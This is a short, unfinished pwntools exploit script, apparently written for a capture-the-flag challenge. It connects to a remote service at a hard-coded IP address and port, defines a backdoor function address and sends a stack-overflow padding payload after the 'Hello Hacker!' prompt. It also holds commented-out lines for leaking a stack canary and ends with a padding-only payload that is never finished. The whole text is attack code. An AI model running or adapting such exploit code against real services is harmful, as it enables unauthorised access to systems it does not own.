from pwn import *
context(arch='i386',os='linux',log_level='debug')
p=remote("39.96.193.120",10004)
elf=ELF('./attachment-5')

back_door=0x80491C6

payload=b'a'*(0x70-4)
p.sendlineafter("Hello Hacker!",payload)
# p.recv(payload)
# canary=p.recvline()
# log.info(canary)



payload=flat([
    b'a'*(0x70-4),
    
])
